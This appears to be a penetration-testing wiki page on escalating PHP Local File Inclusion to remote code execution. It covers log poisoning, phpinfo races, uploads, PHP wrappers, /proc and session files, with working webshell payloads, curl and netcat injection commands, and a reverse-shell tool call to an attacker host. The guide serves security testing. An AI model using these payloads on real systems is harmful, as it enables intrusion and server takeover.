# LFI to RCE

## via logs poisoning

{% hint style="warning" %}
Log files may be stored in different locations depending on the operating system/distribution.
{% endhint %}

<details>

<summary>/var/log/auth.log</summary>

For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth.log`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.

```bash
# Sending the payload via SSH
ssh '<?php phpinfo(); ?>'@$TARGET

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
```

</details>

<details>

<summary>/var/log/vsftpd.log</summary>

When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload (depending on which web technology is used).

```bash
# Sending the payload via FTP
ftp $TARGET_IP
> '<?php system($_GET['cmd'])?>'

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id
```

</details>

<details>

<summary>/var/log/apache2/access.log</summary>

When the web application is using an Apache 2 server, the `access.log` may be accessible using an LFI.

* **About `access.log`**: records all requests processed by the server.
* **About netcat**: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `access.log` path and file depending on the operating system/distribution:

* RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: `/var/log/httpd/access_log`
* Debian / Ubuntu Linux Apache access log file location: `/var/log/apache2`/access.log
* FreeBSD Apache access log file location: `/var/log/httpd-access.log`
* Windows Apache access log file location: \*\*\*\* `C:\xampp\apache\logs`

Or if the web server is under Nginx :

* Linux Nginx access log file location: `/var/log/nginx/access.log`
* Windows Nginx access log file location: `C:\nginx\log`

</details>

<details>

<summary>/var/log/apache/error.log</summary>

This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.

* **About `error.log`**: records any errors encountered in processing requests.
* **About netcat**: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `error.log` path and file depending on the operating system/distribution:

* RHEL / Red Hat / CentOS / Fedora Linux Apache error file location: `/var/log/httpd/error_log`
* Debian / Ubuntu Linux Apache error log file location: `/var/log/apache2/error.log`
* FreeBSD Apache error log file location: `/var/log/httpd-error.log`
* Windows Apache access log file location: \*\*\*\* `C:\xampp\apache\logs`

Or if the web server is under Nginx :

* Linux Nginx access log file location: `/var/log/nginx`
* Windows Nginx access log file location: `C:\nginx\log`

</details>

<details>

<summary>/var/log/mail.log</summary>

When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet (as an example).

```bash
# Sending the payload via telnet
telnet $TARGET_IP $TARGET_PORT
> MAIL FROM:<pentest@pentest.com>
> RCPT TO:<?php system($_GET['cmd']); ?>

# Accessing the log file via LFI
curl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id"
```

</details>

## via phpinfo

{% hint style="info" %}
The prerequisites for this method are :

* having `file_uploads=on` set in the PHP configuration file
* having access to the output of the `phpinfo()` function
{% endhint %}

When `file_uploads=on` is set in the PHP configuration file, it is possible to upload a file by POSTing it on any PHP file ([RFC1867](https://www.ietf.org/rfc/rfc1867.txt)). This file is put to a temporary location on the server and deleted after the HTTP request is fully processed.

The aim of the attack is to POST a PHP reverse shell on the server and delay the processing of the request by adding very long headers to it. This gives enough time to find out the temporary location of the reverse shell using the output of the `phpinfo()` function and including it via the LFI before it gets removed.

The [lfito\_rce](https://github.com/roughiz/lfito\_rce) (Python2) script implements this attack.

```bash
#There is no requirements.txt, the dependencies have to be installed manually
python lfito_rce.py -l "http://$URL/?page=" --lhost=$attackerIP --lport=$attackerPORT -i "http://$URL/phpinfo.php"
```

The "[LFI with phpinfo() assistance](https://docs.google.com/viewerng/viewer?url=https://insomniasec.com/cdn-assets/LFI\_With\_PHPInfo\_Assistance.pdf)" research paper from [Insomnia Security](https://insomniasec.com/) details this attack.

## via file upload

#### Image Upload

{% hint style="info" %}
The prerequisite for this method is to be able to [upload a file](../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).
{% endhint %}

```bash
# GIF8 is for magic bytes
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

curl --user-agent "PENTEST" "$URL/?parameter=/path/to/image/shell.gif&cmd=id"
```

{% hint style="info" %}
Other LFI to RCE via file upload methods may be found later on the chapter [LFI to RCE (via php wrappers)](lfi-to-rce.md#via-php-wrappers-and-streams).
{% endhint %}

## via PHP wrappers and streams

<details>

<summary>data://</summary>

The attribute `allow_url_include` must be set. This configuration can be checked in the `php.ini` file.

{% code overflow="wrap" %}
```bash
# Shell in base64 encoding
echo "<?php system($_GET['cmd']); ?>" | base64

# Accessing the log file via LFI
curl --user-agent "PENTEST" "$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id"
```
{% endcode %}

</details>

<details>

<summary>php://input</summary>

The attribute `allow_url_include` should be set. This configuration can be checked in the `php.ini` file.

{% code overflow="wrap" %}
```bash
# Testers should make sure to change the $URL
curl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
```
{% endcode %}

</details>

<details>

<summary>php://filter</summary>

The `filter` wrapper doesn't require the `allow_url_include` to be set. This works on default PHP configuration `allow_url_include=off`.

{% code overflow="wrap" %}
```bash
# Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.
curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE"
```
{% endcode %}

The research article "[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)" from Synacktiv, and [the original writeup](https://gist.github.com/loknop/b27422), go into the details of that technique.

</details>

<details>

<summary>except://</summary>

The `except` wrapper doesn't required the `allow_url_include` configuration, the `except` extension is required instead.

```bash
curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
```

</details>

<details>

<summary>zip://</summary>

The prerequisite for this method is to be able to [upload a file](../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).

{% code overflow="wrap" %}
```bash
echo "<?php system($_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php

# Accessing the log file via LFI (the # identifier is URL-encoded)
curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd=id"
```
{% endcode %}

</details>

<details>

<summary>phar://</summary>

The prerequisite for this method is to be able to [upload a file](../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

The tester need to compile this script into a `.phar` file that when called would write a shell called `shell.txt` .

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now the tester has a `phar` file named `shell.jpg` and he can trigger it through the `phar://` wrapper.

{% code overflow="wrap" %}
```bash
curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id"
```
{% endcode %}

</details>

## via /proc

<details>

<summary>/proc/self/environ</summary>

Testers can abuse a process created due to a request. The payload is injected in the `User-Agent` header.

```bash
# Sending a request to $URL with a malicious user-agent
# Accessing the payload via LFI
curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../proc/self/environ
```

</details>

<details>

<summary>🛠️ /proc/*/fd</summary>



</details>

## via PHP session

When a web server wants to handle sessions, it can use PHP session cookies (`PHPSESSID`).

1.  Finding where the sessions are stored.

    Examples:

    * Linux : `/var/lib/php5/sess_[PHPSESSID]`
    * Linux : `/var/lib/php/sessions/sess_[PHPSESSID]`
    * Windows : `C:\Windows\Temp\`
2.  Displaying a `PHPSESSID` to see if any parameter is reflected inside.

    Example:

    * The user name for the session (from a parameter called `user`)
    * The language used by the user (from a parameter called `lang`)

    _Exemple :_

```http
GET /?user=/var/lib/php/sessions/sess_[PHPSESSID] HTTP/2

username|s:6:"tester";lang|s:7:"English";
```

3\. Inject some PHP code in the reflected parameter in the session

```http
GET /?user=<%3fphp+system($_GET['cmd'])%3b+%3f> HTTP/2
```

4\. Call the `session file`with the vulnerable parameter to trigger a command exection

```http
GET /?user=/var/lib/php/sessions/sess_[PHPSESSID]&cmd=id HTTP/2

</h2> username|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
";lang|s:7:"English";
```
